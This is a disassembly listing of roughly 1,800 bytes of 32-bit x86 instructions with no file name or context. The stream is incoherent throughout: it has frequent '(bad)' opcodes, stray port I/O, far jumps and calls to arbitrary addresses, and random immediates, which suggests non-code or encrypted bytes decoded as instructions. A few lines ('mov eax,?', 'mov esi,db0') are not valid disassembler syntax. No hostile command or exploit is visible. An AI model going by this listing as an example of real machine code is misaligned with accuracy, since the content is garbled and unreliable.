  41d449:	fucomi st,st(0)
  41d44b:	enter  0x7c4a,0xe8
  41d44f:	ret    0x2662
  41d452:	fsub   st(4),st
  41d454:	not    DWORD PTR [ecx+0x6b]
  41d457:	inc    edx
  41d458:	mov    eax,0xbbc59d3a
  41d45d:	xchg   ebp,eax
  41d45e:	lods   eax,DWORD PTR ds:[esi]
  41d45f:	mov    al,ds:0xb7d7a1b
  41d464:	xchg   DWORD PTR [esi],esp
  41d466:	add    DWORD PTR [edx+edi*1+0x5e],ebp
  41d46a:	sub    eax,0x1dce2479
  41d46f:	push   ebp
  41d470:	fist   WORD PTR [ecx]
  41d472:	repz pop es
  41d474:	ins    BYTE PTR es:[edi],dx
  41d475:	mov    dl,0x32
  41d477:	inc    ecx
  41d478:	lock xchg DWORD PTR ds:0x31f45705,eax
  41d47f:	daa    
  41d480:	adc    eax,0xde72c5ba
  41d485:	xchg   esi,eax
  41d486:	xchg   ebx,eax
  41d487:	cmc    
  41d488:	data16 cmp dl,cl
  41d48b:	retf   0x606f
  41d48e:	popa   
  41d48f:	mov    BYTE PTR [ebx+0x33299662],bh
  41d495:	xlat   BYTE PTR ds:[ebx]
  41d496:	sub    BYTE PTR [edx+0x3b662bc0],bh
  41d49c:	ss inc edi
  41d49e:	xchg   ch,bh
  41d4a0:	in     al,dx
  41d4a1:	inc    eax
  41d4a2:	outs   dx,DWORD PTR ds:[esi]
  41d4a3:	inc    edx
  41d4a4:	sahf   
  41d4a5:	inc    ebx
  41d4a6:	clc    
  41d4a7:	(bad)  
  41d4a8:	in     eax,dx
  41d4a9:	test   BYTE PTR [ecx+0x1d19e55d],al
  41d4af:	jle    0x41d52b
  41d4b1:	in     eax,dx
  41d4b2:	aaa    
  41d4b3:	(bad)  
  41d4b4:	mov    es,WORD PTR [eax+0x7b]
  41d4b7:	aam    0x16
  41d4b9:	inc    eax
  41d4ba:	cmp    DWORD PTR [ebx*4+0x27b5ff8c],edi
  41d4c1:	in     al,0x22
  41d4c3:	mov    edi,0xa9393ec9
  41d4c8:	test   al,0xc
  41d4ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4cb:	shr    BYTE PTR [edx+0x36d6055d],0x9e
  41d4d2:	(bad)  
  41d4d3:	sub    ah,bl
  41d4d5:	and    ebx,0x44
  41d4d8:	push   esi
  41d4d9:	adc    esp,ecx
  41d4db:	xor    BYTE PTR [ebx+0x13],dh
  41d4de:	pop    edi
  41d4df:	(bad)  
  41d4e0:	pushf  
  41d4e1:	loopne 0x41d562
  41d4e3:	call   0x788c7f4b
  41d4e8:	push   ss
  41d4e9:	es mov edi,0x88bf0756
  41d4ef:	dec    ecx
  41d4f0:	fisubr WORD PTR [edx]
  41d4f2:	jmp    0xb879:0x6fb5744b
  41d4f9:	sub    edi,DWORD PTR [ebx+0xcef64cd]
  41d4ff:	mov    eax,0x547ea618
  41d504:	xchg   edx,eax
  41d505:	pop    ss
  41d506:	shl    BYTE PTR [esi+0x205ab0f5],1
  41d50c:	cmp    BYTE PTR [ecx+edx*8-0x73e01046],dh
  41d513:	cld    
  41d514:	adc    ebx,DWORD PTR [ebx]
  41d516:	sbb    BYTE PTR [ebx],ch
  41d518:	inc    esi
  41d519:	stos   DWORD PTR es:[edi],eax
  41d51a:	int    0xab
  41d51c:	xlat   BYTE PTR ds:[ebx]
  41d51d:	xchg   esi,eax
  41d51e:	inc    ebx
  41d51f:	dec    esp
  41d520:	in     eax,dx
  41d521:	sbb    DWORD PTR [ecx-0x5d],0xaaabb1a9
  41d528:	pushf  
  41d529:	call   0x336dc59d
  41d52e:	sbb    eax,0xba87b778
  41d533:	dec    esp
  41d534:	hlt    
  41d535:	repnz (bad)
  41d538:	das    
  41d539:	imul   ebx,edi,0x9b37f17a
  41d53f:	rol    bl,1
  41d541:	mov    ecx,0xb72745fc
  41d546:	push   ss
  41d547:	dec    ebp
  41d548:	push   es
  41d549:	dec    edx
  41d54a:	cmp    DWORD PTR [esi-0x32],ecx
  41d54d:	into   
  41d54e:	xchg   ebp,eax
  41d54f:	scas   eax,DWORD PTR es:[edi]
  41d550:	pop    eax
  41d551:	popf   
  41d552:	nop
  41d553:	cmp    al,0xdf
  41d555:	push   esp
  41d556:	mul    ebp
  41d558:	clc    
  41d559:	inc    ebx
  41d55a:	lds    edi,FWORD PTR [esi-0x60]
  41d55d:	mov    al,ds:0xa0a725b7
  41d562:	xchg   BYTE PTR [edi-0x44],dh
  41d565:	lods   eax,DWORD PTR ds:[esi]
  41d566:	je     0x41d5d2
  41d568:	fcomi  st,st(7)
  41d56a:	mov    al,ds:0x2664210
  41d56f:	sar    DWORD PTR [eax-0x771b77b9],cl
  41d575:	or     DWORD PTR [edx+0x2a8481c],esp
  41d57b:	test   DWORD PTR ds:0x15784457,0x4f24fc
  41d585:	push   cs
  41d586:	aad    0xb0
  41d588:	in     al,dx
  41d589:	push   es
  41d58a:	imul   ebx,ebx,0x3270ea6d
  41d590:	(bad)  
  41d591:	loopne 0x41d5ba
  41d593:	ins    DWORD PTR es:[edi],dx
  41d594:	fs mov al,0x3f
  41d597:	ins    DWORD PTR es:[edi],dx
  41d598:	lahf   
  41d599:	out    dx,al
  41d59a:	push   es
  41d59b:	cmp    eax,0x3596d5f2
  41d5a0:	dec    eax
  41d5a1:	cli    
  41d5a2:	cwde   
  41d5a3:	jae    0x41d5b0
  41d5a5:	adc    DWORD PTR [eax],ebp
  41d5a7:	lods   al,BYTE PTR ds:[esi]
  41d5a8:	cmc    
  41d5a9:	dec    ebx
  41d5aa:	sub    al,0x31
  41d5ac:	icebp  
  41d5ad:	push   ss
  41d5ae:	adc    eax,0xbad0a31e
  41d5b3:	(bad)  
  41d5b4:	in     eax,dx
  41d5b5:	fld    DWORD PTR [edi-0x47]
  41d5b8:	jmp    0x2fc6:0x52c53c55
  41d5bf:	inc    ecx
  41d5c0:	aad    0xbf
  41d5c2:	imul   ebx,DWORD PTR [ebp+eax*1-0x78],0xb5304e00
  41d5ca:	daa    
  41d5cb:	test   BYTE PTR [ecx-0x34],bh
  41d5ce:	push   ebx
  41d5cf:	add    dl,ah
  41d5d1:	pop    ds
  41d5d2:	lds    edi,FWORD PTR [ecx]
  41d5d4:	popa   
  41d5d5:	imul   esi,DWORD PTR [edi+edx*1],0x49
  41d5d9:	pop    ss
  41d5da:	aaa    
  41d5db:	and    BYTE PTR [ebp-0xbe85700],dl
  41d5e1:	les    ebp,FWORD PTR [eax-0x37]
  41d5e4:	sub    dl,dl
  41d5e6:	repnz mov cl,0xac
  41d5e9:	cmp    eax,0xb68577b
  41d5ee:	ja     0x41d5ef
  41d5f0:	xor    DWORD PTR [ebx+0x76],edi
  41d5f3:	das    
  41d5f4:	in     al,0x1a
  41d5f6:	loopne 0x41d656
  41d5f8:	(bad)  
  41d5f9:	mov    bh,0xe6
  41d5fb:	cwde   
  41d5fc:	or     ebx,edi
  41d5fe:	push   es
  41d5ff:	dec    ecx
  41d600:	ficom  DWORD PTR ds:0x68669839
  41d606:	xlat   BYTE PTR ds:[ebx]
  41d607:	test   al,0x6
  41d609:	sbb    esp,esi
  41d60b:	mov    ebp,0x177cd509
  41d610:	int    0xb8
  41d612:	sti    
  41d613:	xor    eax,0x2a67aaf8
  41d618:	sahf   
  41d619:	xchg   ecx,eax
  41d61a:	js     0x41d632
  41d61c:	push   ecx
  41d61d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d61e:	faddp  st(0),st
  41d620:	shl    BYTE PTR [esi+0x44b66551],cl
  41d626:	and    ecx,DWORD PTR [eax-0x1d]
  41d629:	pop    edx
  41d62a:	push   ss
  41d62b:	jne    0x41d65f
  41d62d:	mov    ds:0xc4903624,al
  41d632:	cwde   
  41d633:	push   0x1d
  41d635:	scas   eax,DWORD PTR es:[edi]
  41d636:	inc    edi
  41d637:	mov    ds:0x840dc230,al
  41d63c:	sti    
  41d63d:	xchg   edi,eax
  41d63e:	push   ds
  41d63f:	loopne 0x41d672
  41d641:	das    
  41d642:	push   cs
  41d643:	imul   BYTE PTR [eax]
  41d645:	or     ah,BYTE PTR [ebp-0x3b054ba1]
  41d64b:	iret   
  41d64c:	cmp    al,0x9c
  41d64e:	jmp    0x1dcbf017
  41d653:	in     eax,dx
  41d654:	jne    0x41d661
  41d656:	jge    0x41d6cf
  41d658:	imul   ah
  41d65a:	fs and al,0xbb
  41d65d:	cs in  al,0xf5
  41d660:	stos   DWORD PTR es:[edi],eax
  41d661:	js     0x41d6ba
  41d663:	jge    0x41d624
  41d665:	push   eax
  41d666:	imul   eax,DWORD PTR [esi+0x54],0x72
  41d66a:	imul   ecx,eax,0x31c0fde2
  41d670:	pop    edi
  41d671:	xlat   BYTE PTR ds:[ebx]
  41d672:	test   DWORD PTR [ebx+0x72945d11],0x92924a47
  41d67c:	mov    eax,0x91d16ac1
  41d681:	gs gs adc eax,0xaafbc00f
  41d688:	sub    eax,0xb7eb63ad
  41d68d:	xchg   edi,eax
  41d68e:	js     0x41d6a5
  41d690:	(bad)
  41d694:	pop    eax
  41d695:	sub    eax,0xbece3a3b
  41d69a:	pop    esp
  41d69b:	dec    esi
  41d69c:	xor    al,0xb
  41d69e:	and    ebx,0x15
  41d6a1:	pop    esi
  41d6a2:	add    bl,BYTE PTR [ebp+0x67]
  41d6a5:	repz or eax,0xf5a55aca
  41d6ab:	dec    eax
  41d6ac:	(bad)  
  41d6ad:	fcmovb st,st(7)
  41d6af:	mov    ah,0xd7
  41d6b1:	ret    0x2160
  41d6b4:	cmp    ah,al
  41d6b6:	in     eax,dx
  41d6b7:	pop    ebp
  41d6b8:	pop    ss
  41d6b9:	retf   
  41d6ba:	je     0x41d685
  41d6bc:	repnz and al,0x54
  41d6bf:	push   edi
  41d6c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6c1:	test   al,0xdf
  41d6c3:	jecxz  0x41d710
  41d6c5:	add    BYTE PTR [eax+0x1],cl
  41d6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6c9:	pop    esi
  41d6ca:	bound  ebp,QWORD PTR ds:0x5c839879
  41d6d0:	xchg   ecx,eax
  41d6d1:	sub    eax,DWORD PTR [esi]
  41d6d3:	lea    ecx,[ecx+ecx*2]
  41d6d6:	mov    ecx,0x9b9abd6e
  41d6db:	das    
  41d6dc:	mov    edi,0x850fe5a9
  41d6e1:	sub    DWORD PTR [ecx],eax
  41d6e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6e4:	jge    0x41d6f3
  41d6e6:	adc    dl,BYTE PTR [ecx+eiz*1+0x64]
  41d6ea:	pop    ss
  41d6eb:	(bad)  
  41d6ec:	call   0xef244700
  41d6f1:	rcr    DWORD PTR [esi+ebx*1-0x13],cl
  41d6f5:	outs   dx,BYTE PTR ds:[esi]
  41d6f6:	jmp    0x41d756
  41d6f8:	ret    
  41d6f9:	lods   eax,DWORD PTR ds:[esi]
  41d6fa:	loope  0x41d6b6
  41d6fc:	mov    eax,0x78795b97
  41d701:	in     eax,dx
  41d702:	jecxz  0x41d6e7
  41d704:	and    dh,bh
  41d706:	ins    BYTE PTR es:[edi],dx
  41d707:	js     0x41d6c9
  41d709:	sti    
  41d70a:	xor    BYTE PTR [ecx],cl
  41d70c:	(bad)  
  41d70d:	retf   
  41d70e:	mov    ebx,DWORD PTR [esi-0xf]
  41d711:	adc    esp,ebp
  41d713:	push   es
  41d714:	pop    esp
  41d715:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d716:	data16 scas al,BYTE PTR es:[edi]
  41d718:	jmp    0x9c2e:0xdee87454
  41d71f:	or     BYTE PTR [ebp+0x53],ch
  41d722:	call   0xc7e3:0x342a2d65
  41d729:	ficomp DWORD PTR [esp+ecx*2]
  41d72c:	add    DWORD PTR [ebp+0x76778659],edx
  41d732:	test   al,0x3a
  41d734:	gs scas eax,DWORD PTR es:[edi]
  41d736:	retf   0x2c59
  41d739:	das    
  41d73a:	xchg   ebp,eax
  41d73b:	outs   dx,BYTE PTR ds:[esi]
  41d73c:	scas   al,BYTE PTR es:[edi]
  41d73d:	xchg   BYTE PTR [ebp-0x5e],dh
  41d740:	pop    ebp
  41d741:	mov    cl,0x5d
  41d743:	cmp    eax,0x2a60ead7
  41d748:	es rcl ebx,0xff
  41d74c:	add    al,0x65
  41d74e:	pop    ecx
  41d74f:	div    bl
  41d751:	add    ebx,ecx
  41d753:	out    dx,eax
  41d754:	push   edi
  41d755:	das    
  41d756:	and    BYTE PTR [ebp+0x10],ah
  41d759:	sbb    al,0xfb
  41d75b:	ret    
  41d75c:	sbb    esi,DWORD PTR [edi+0x72d15c17]
  41d762:	test   BYTE PTR [ebp+0x32],bl
  41d765:	stos   BYTE PTR es:[edi],al
  41d766:	xchg   BYTE PTR [esi],dh
  41d768:	test   al,0xd4
  41d76a:	mov    eax,ds:0xc6735d52
  41d76f:	mov    ebx,0x49518bd6
  41d774:	stos   DWORD PTR es:[edi],eax
  41d775:	mov    bl,0x12
  41d777:	jnp    0x41d770
  41d779:	out    0x4,eax
  41d77b:	fisub  DWORD PTR [edi-0x327669a7]
  41d781:	sub    cl,ah
  41d783:	mov    edi,es
  41d785:	ror    DWORD PTR [ebx-0x25f5d840],cl
  41d78b:	das    
  41d78c:	push   ebp
  41d78d:	lock dec eax
  41d78f:	push   ebp
  41d790:	icebp  
  41d791:	arpl   WORD PTR [edx+edi*8+0x4f6ffb49],dx
  41d798:	add    al,0x96
  41d79a:	ja     0x41d72b
  41d79c:	sbb    BYTE PTR [ebp+0x3272ac75],ch
  41d7a2:	mov    edi,0x69383f1f
  41d7a7:	mov    bh,0x96
  41d7a9:	(bad)  [eax-0x7b561bdd]
  41d7af:	cwde   
  41d7b0:	outs   dx,DWORD PTR ds:[esi]
  41d7b1:	bound  edi,QWORD PTR [ecx]
  41d7b3:	or     eax,0xe6a1abe7
  41d7b8:	mov    edi,0x6d33fbaa
  41d7bd:	cmp    al,BYTE PTR [ebx+edx*2]
  41d7c0:	xor    edx,DWORD PTR [edx+0x2fa0d351]
  41d7c6:	mov    ecx,0x5211b4c3
  41d7cb:	rcl    bl,1
  41d7cd:	(bad)  
  41d7ce:	pop    ss
  41d7cf:	aam    0xfb
  41d7d1:	js     0x41d836
  41d7d3:	inc    esi
  41d7d4:	adc    al,0x5a
  41d7d6:	cdq    
  41d7d7:	aam    0x81
  41d7d9:	jne    0x41d7d0
  41d7db:	sbb    eax,DWORD PTR [ecx-0x2c]
  41d7de:	inc    ebp
  41d7df:	aad    0x30
  41d7e1:	push   edi
  41d7e2:	leave  
  41d7e3:	xlat   BYTE PTR ds:[ebx]
  41d7e4:	jno    0x41d7d8
  41d7e6:	je     0x41d833
  41d7e8:	jmp    0x6b168e91
  41d7ed:	dec    esp
  41d7ee:	adc    BYTE PTR [ebx],0xf7
  41d7f1:	xchg   ecx,eax
  41d7f2:	(bad)  
  41d7f3:	cwde   
  41d7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7f5:	ds loope 0x41d833
  41d7f8:	mov    ebx,0x595a54a7
  41d7fd:	sub    DWORD PTR [ecx-0x7426c527],esi
  41d803:	call   0xf49df019
  41d808:	jns    0x41d872
  41d80a:	ss adc ch,cl
  41d80d:	jb     0x41d84d
  41d80f:	es mov ebx,0x653bb482
  41d815:	xor    dh,BYTE PTR [ebp-0x3e]
  41d818:	mov    edx,0xec618377
  41d81d:	ret    
  41d81e:	lods   eax,DWORD PTR ds:[esi]
  41d81f:	mov    ah,0xa4
  41d821:	xor    al,0x2e
  41d823:	pop    esp
  41d824:	pop    ds
  41d825:	xchg   edx,eax
  41d826:	jns    0x41d875
  41d828:	jb     0x41d7c9
  41d82a:	fist   WORD PTR [edx]
  41d82c:	lahf   
  41d82d:	jo     0x41d830
  41d82f:	xchg   ebp,eax
  41d830:	das    
  41d831:	add    bl,al
  41d833:	or     ebx,esp
  41d835:	jge    0x41d843
  41d837:	push   edx
  41d838:	pushf  
  41d839:	add    DWORD PTR [esi],esp
  41d83b:	stos   BYTE PTR es:[edi],al
  41d83c:	ror    BYTE PTR [ecx],cl
  41d83e:	lods   al,BYTE PTR ds:[esi]
  41d83f:	pop    es
  41d840:	sub    esi,ebp
  41d842:	outs   dx,DWORD PTR ds:[esi]
  41d843:	test   eax,0xd3ed5bbd
  41d848:	jae    0x41d7e7
  41d84a:	or     dl,BYTE PTR [ecx]
  41d84c:	std    
  41d84d:	or     ecx,edi
  41d84f:	retf   
  41d850:	leave  
  41d851:	cmp    DWORD PTR [ebx],ebp
  41d853:	fucomp st(6)
  41d855:	int3   
  41d856:	lea    ecx,[ecx+0x1ac5cfdc]
  41d85c:	xlat   BYTE PTR ds:[ebx]
  41d85d:	xchg   bh,cl
  41d85f:	cdq    
  41d860:	xchg   edx,eax
  41d861:	cli    
  41d862:	xor    BYTE PTR [edx],dl
  41d864:	inc    edi
  41d865:	out    0x15,al
  41d867:	jp     0x41d8c3
  41d869:	xlat   BYTE PTR ds:[ebx]
  41d86a:	cmp    ecx,edi
  41d86c:	push   ecx
  41d86d:	cmc    
  41d86e:	dec    ebx
  41d86f:	out    dx,eax
  41d870:	daa    
  41d871:	je     0x41d8be
  41d873:	mov    bh,0xeb
  41d875:	nop
  41d876:	(bad)  
  41d877:	(bad)  
  41d878:	mov    eax,ds:0x10795a12
  41d87d:	sbb    al,0x47
  41d87f:	clc    
  41d880:	stos   BYTE PTR es:[edi],al
  41d881:	adc    bl,BYTE PTR [edx]
  41d883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d884:	out    dx,eax
  41d885:	jnp    0x41d815
  41d887:	cmp    dl,0x2f
  41d88a:	(bad)  
  41d88b:	and    eax,0x11f808dc
  41d890:	jno    0x41d83e
  41d892:	xchg   ecx,eax
  41d893:	aam    0x42
  41d895:	pop    es
  41d896:	in     al,0x2b
  41d898:	jns    0x41d8cb
  41d89a:	and    BYTE PTR [eax],dh
  41d89c:	mov    eax,0xb72be16c
  41d8a1:	push   ebp
  41d8a2:	cmp    al,0x9a
  41d8a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8a5:	xchg   ecx,eax
  41d8a6:	sbb    edi,DWORD PTR [edi+ebx*8+0x68b8a90d]
  41d8ad:	iret   
  41d8ae:	xlat   BYTE PTR ds:[ebx]
  41d8af:	sub    ah,BYTE PTR [edx]
  41d8b1:	imul   esp,edi,0x6557095b
  41d8b7:	loopne 0x41d8bc
  41d8b9:	(bad)  
  41d8ba:	jmp    0x8cd6:0x7eef2259
  41d8c1:	add    cl,bl
  41d8c3:	inc    ebx
  41d8c4:	inc    ecx
  41d8c5:	call   0xc8d27296
  41d8ca:	jne    0x41d861
  41d8cc:	sbb    BYTE PTR [ecx+0x1c],ch
  41d8cf:	fs clc 
  41d8d1:	sbb    al,0x38
  41d8d3:	(bad)  
  41d8d4:	sbb    cl,ah
  41d8d6:	mov    ah,0x3
  41d8d8:	retf   
  41d8d9:	stos   DWORD PTR es:[edi],eax
  41d8da:	shl    ebx,1
  41d8dc:	sbb    ebx,DWORD PTR [edi]
  41d8de:	aaa    
  41d8df:	not    BYTE PTR [ebp-0x3e483020]
  41d8e5:	rcr    DWORD PTR [edi],cl
  41d8e7:	pushf  
  41d8e8:	pusha  
  41d8e9:	push   ebp
  41d8ea:	jecxz  0x41d913
  41d8ec:	jmp    0x41d94a
  41d8ee:	mov    dl,0x8
  41d8f0:	dec    esp
  41d8f1:	ds cwde 
  41d8f3:	or     eax,0xc07924e9
  41d8f8:	pop    ebx
  41d8f9:	or     BYTE PTR [ebx-0x4fd5958f],0x94
  41d900:	rcl    DWORD PTR [ecx-0x4143aa5f],0x1e
  41d907:	mov    eax,?
  41d909:	test   BYTE PTR [esp+esi*4+0x11ca7ded],0xdd
  41d911:	test   eax,0x7b7583d2
  41d916:	or     DWORD PTR [edx-0x41348e95],eax
  41d91c:	cld    
  41d91d:	or     eax,DWORD PTR [esi+esi*1-0x275fa7b4]
  41d924:	out    dx,eax
  41d925:	jp     0x41d954
  41d927:	(bad)  
  41d928:	sar    DWORD PTR [edi-0x101f30e9],0x42
  41d92f:	or     ah,BYTE PTR [edx+eax*8]
  41d932:	push   ebx
  41d933:	add    eax,0x51fbed5f
  41d938:	imul   edi,DWORD PTR [ebx-0x5],0x29
  41d93c:	cmp    ebx,ecx
  41d93e:	ror    ecx,cl
  41d940:	jns    0x41d91f
  41d942:	or     ecx,DWORD PTR [ebx]
  41d944:	add    DWORD PTR [ebx],ecx
  41d946:	mov    ah,0x9a
  41d948:	fild   QWORD PTR [ecx+0x56]
  41d94b:	mov    ecx,0x1700d9e2
  41d950:	cwde   
  41d951:	into   
  41d952:	sbb    al,0x70
  41d954:	leave  
  41d955:	je     0x41d917
  41d957:	sub    BYTE PTR [ecx+0x60af9d6b],0x17
  41d95e:	(bad)  
  41d960:	xor    DWORD PTR [eax],ecx
  41d962:	(bad)  
  41d963:	outs   dx,DWORD PTR ds:[esi]
  41d964:	add    al,0xbf
  41d966:	cli    
  41d967:	and    BYTE PTR [eax+0x3098f8c1],0xde
  41d96e:	gs push ebx
  41d970:	mov    al,es:0xab0f9f84
  41d976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d977:	xchg   edi,eax
  41d978:	jae    0x41d998
  41d97a:	mov    edi,esi
  41d97c:	cmp    al,0x2b
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	pop    esi
  41d980:	adc    ch,dh
  41d982:	ja     0x41d90c
  41d984:	sub    ah,BYTE PTR [esi]
  41d986:	mov    ds:0x6838d314,al
  41d98b:	adc    ebx,0xfb47bd51
  41d991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d992:	mov    cr7,ebx
  41d995:	and    DWORD PTR [ecx-0xbd75ea2],ebp
  41d99b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99c:	retf   0xd6c0
  41d99f:	test   BYTE PTR [ebp+0x4cff2663],dh
  41d9a5:	lods   eax,DWORD PTR ds:[esi]
  41d9a6:	xor    eax,0xe58abc1b
  41d9ab:	loop   0x41da08
  41d9ad:	imul   esp,DWORD PTR [eax],0xffffffc0
  41d9b0:	pop    ebp
  41d9b1:	cmp    BYTE PTR [ecx],cl
  41d9b3:	fld    QWORD PTR [ecx-0x7d]
  41d9b6:	push   0xeb6d407d
  41d9bb:	(bad)  
  41d9bc:	std    
  41d9bd:	add    BYTE PTR [ebp-0x32627839],bh
  41d9c3:	inc    ebp
  41d9c4:	xor    eax,edi
  41d9c6:	ret    0x2663
  41d9c9:	and    BYTE PTR [edi-0x3744d0bd],ch
  41d9cf:	jo     0x41d9e1
  41d9d1:	inc    edi
  41d9d2:	fild   QWORD PTR [ebx+0x49a3517e]
  41d9d8:	xor    al,0x51
  41d9da:	jns    0x41d99c
  41d9dc:	pop    ebx
  41d9dd:	cmp    edx,DWORD PTR [ecx+0x5a377d56]
  41d9e3:	xor    ecx,edi
  41d9e5:	jmp    0x41d968
  41d9e7:	jno    0x41d9b5
  41d9e9:	xchg   ecx,eax
  41d9ea:	outs   dx,DWORD PTR ds:[esi]
  41d9eb:	xchg   edx,eax
  41d9ec:	adc    cl,BYTE PTR [eax]
  41d9ee:	in     al,dx
  41d9ef:	lods   al,BYTE PTR ds:[esi]
  41d9f0:	cld    
  41d9f1:	(bad)  
  41d9f3:	adc    dl,BYTE PTR [eax]
  41d9f5:	adc    ecx,esp
  41d9f7:	fmulp  st(3),st
  41d9f9:	add    edi,edx
  41d9fb:	mov    edx,DWORD PTR [esi-0x3ee3981d]
  41da01:	sub    ebp,DWORD PTR [esi+0x47]
  41da04:	or     DWORD PTR [ebx],0x68ee1d98
  41da0a:	jne    0x41da6a
  41da0c:	mov    esp,0xffa56fee
  41da11:	mov    WORD PTR [edi-0x17],es
  41da14:	(bad)  
  41da15:	js     0x41da83
  41da17:	ss fmul st,st(4)
  41da1a:	dec    ebp
  41da1b:	popf   
  41da1c:	xchg   esp,eax
  41da1d:	(bad)  
  41da1e:	lods   eax,DWORD PTR ds:[esi]
  41da1f:	xchg   edi,eax
  41da20:	aaa    
  41da21:	dec    edx
  41da22:	ss xchg esi,eax
  41da24:	sbb    al,0x8c
  41da26:	popf   
  41da27:	lock add esp,esi
  41da2a:	add    al,0x46
  41da2c:	mov    dh,0xa3
  41da2e:	add    DWORD PTR [eax],eax
  41da30:	adc    DWORD PTR [ebp-0x73eeeca8],ebp
  41da36:	aam    0xc2
  41da38:	retf   
  41da39:	outs   dx,DWORD PTR ds:[esi]
  41da3a:	mov    cs,WORD PTR [ebx+0x72]
  41da3d:	xchg   BYTE PTR [edx+esi*8],bl
  41da40:	push   0xc8b09e80
  41da45:	jmp    0x41da3f
  41da47:	adc    al,0xa1
  41da49:	cmp    BYTE PTR [ebx+eiz*2+0x161c226d],0xbc
  41da51:	rcl    DWORD PTR [ecx],cl
  41da53:	lock pop ecx
  41da55:	xchg   ebx,eax
  41da56:	xor    esp,eax
  41da58:	test   esi,esp
  41da5a:	je     0x41da48
  41da5c:	or     dl,BYTE PTR [eax+0x21]
  41da5f:	stos   DWORD PTR es:[edi],eax
  41da60:	dec    ebp
  41da61:	jns    0x41d9fb
  41da63:	jno    0x41da47
  41da65:	test   eax,0x87b481f4
  41da6a:	jns    0x41da95
  41da6c:	xor    dh,BYTE PTR [edi-0xd]
  41da6f:	sub    eax,0x9f11fa07
  41da74:	hlt    
  41da75:	mov    cl,0xbd
  41da77:	add    eax,0x8104ca2f
  41da7c:	and    edx,DWORD PTR [ebx]
  41da7e:	(bad)  
  41da7f:	in     eax,dx
  41da80:	sbb    ah,BYTE PTR [edx+0x39ef2c16]
  41da86:	and    BYTE PTR [ecx],0xe5
  41da89:	mov    edi,0xe11a260e
  41da8e:	xor    DWORD PTR [esi+0x76927402],eax
  41da94:	daa    
  41da95:	push   ebp
  41da96:	dec    edi
  41da97:	xchg   DWORD PTR [ebx-0x27],eax
  41da9a:	enter  0xca1b,0x7e
  41da9e:	push   ss
  41da9f:	je     0x41da4b
  41daa1:	mov    edx,0x1950b64c
  41daa6:	cmp    ecx,DWORD PTR [edi]
  41daa8:	mov    bl,0xb0
  41daaa:	mov    ah,0x23
  41daac:	rol    BYTE PTR [ecx],0x66
  41daaf:	xchg   edx,eax
  41dab0:	popf   
  41dab1:	mov    ecx,0x549eb7cd
  41dab6:	pop    edi
  41dab7:	add    bl,BYTE PTR [ebx]
  41dab9:	dec    edx
  41daba:	pop    es
  41dabb:	sbb    ch,dh
  41dabd:	xchg   ecx,eax
  41dabe:	inc    ecx
  41dabf:	adc    al,0x88
  41dac1:	retf   0xf348
  41dac4:	inc    edi
  41dac5:	xor    cl,BYTE PTR cs:[ebp+0x4514dfd5]
  41dacc:	imul   esp
  41dace:	mov    eax,ds:0x38446579
  41dad3:	aam    0xb
  41dad5:	jecxz  0x41dae4
  41dad7:	xchg   DWORD PTR [edx+eax*4-0xf],edi
  41dadb:	xor    BYTE PTR [ebx],dh
  41dadd:	repz dec edx
  41dadf:	mov    eax,0xcb7a2a9f
  41dae4:	xchg   esi,eax
  41dae5:	mov    eax,0xbd3e99b5
  41daea:	imul   ebx,DWORD PTR [ebx],0xc378af1
  41daf0:	add    eax,0x4a2924e
  41daf5:	adc    ch,bl
  41daf7:	sub    ebx,ecx
  41daf9:	jne    0x41daca
  41dafb:	mov    ebx,0x3c2f8424
  41db00:	mov    BYTE PTR gs:[ebp+0x2ab40c0a],dh
  41db07:	mov    esi,db0
  41db0a:	shl    BYTE PTR [eax-0x5f],0x66
  41db0e:	jmp    0xf0a3:0x45b40c95
  41db15:	pop    eax
  41db16:	cmp    al,0xdf
  41db18:	jnp    0x41db86
  41db1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db1b:	mov    ds:0x51498c21,al
  41db20:	mov    bl,0xae
  41db22:	mov    DWORD PTR [edi+eax*4-0x650a437],ecx
  41db29:	jo     0x41db74
  41db2b:	test   dh,0x89
  41db2e:	or     al,BYTE PTR [ebp-0x29]
  41db31:	out    dx,al
  41db32:	and    DWORD PTR [eax+0x1],esp
  41db35:	pop    ds
  41db36:	sti    
  41db37:	fdivr  DWORD PTR [edx]
  41db39:	ins    BYTE PTR es:[edi],dx
  41db3a:	inc    esi
  41db3b:	mov    dh,BYTE PTR [edi+0xb]
  41db3e:	or     edx,DWORD PTR [ebx+0x49]
  41db41:	mov    esp,0x2124275e
  41db46:	add    eax,0x65cda8b2
  41db4b:	sbb    al,0x52
  41db4d:	sar    BYTE PTR [ecx+0x26],cl
  41db50:	mov    cl,0xea
  41db52:	enter  0x8335,0x71
  41db56:	dec    ebp
  41db57:	cdq    
  41db58:	in     eax,dx
  41db59:	nop
  41db5a:	mov    edi,0x664056b1
  41db5f:	lea    esi,[ebx+0x59]
  41db62:	jle    0x41dba1
  41db64:	jmp    0x41db82
  41db66:	pop    edi
  41db67:	mov    dh,0xcc
  41db69:	scas   eax,DWORD PTR es:[edi]
  41db6a:	call   0x27606a46
  41db6f:	cdq    
  41db70:	jno    0x41db57
  41db72:	xchg   BYTE PTR [edx-0x25],cl
  41db75:	dec    esi
  41db76:	in     eax,0x88
  41db78:	retf   0x3e3e
  41db7b:	pop    ecx
  41db7c:	xchg   esi,eax
  41db7d:	add    DWORD PTR [edx],0xe80176d6
  41db83:	addr16 jno 0x41db64
  41db86:	leave  
  41db87:	arpl   WORD PTR [edx-0x2ead8be7],cx
  41db8d:	mov    eax,ds:0xa4331327
  41db92:	adc    esi,ecx
  41db94:	aas    
  41db95:	lock inc eax
  41db97:	shr    DWORD PTR [edi+0x63],0x1f
  41db9b:	xchg   edx,eax
